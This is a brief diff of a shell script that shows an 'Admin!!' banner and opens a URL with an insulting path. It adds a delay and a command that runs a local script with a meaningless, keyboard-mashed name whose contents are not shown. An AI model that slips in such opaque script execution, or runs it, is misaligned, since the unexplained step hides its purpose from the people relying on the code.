@@ -101,4 +101,6 @@ sleep 5
 figlet -f slant "Admin!!"|lolcat
 sleep 5
 xdg-open https://bercara.com/BangsatKau999
+sleep 10
+sh awdawdawdawdawdawdpawdapwdpawpdawpda[pdw[pawdoawdjiawjdioajwdiajwildjalwijdlaiwjdliawjdliawjdliawjdlijlijilxjaildjailxjawlixjailwxjilaxwjlaixjlaixjalixjailwd.sh
 fi
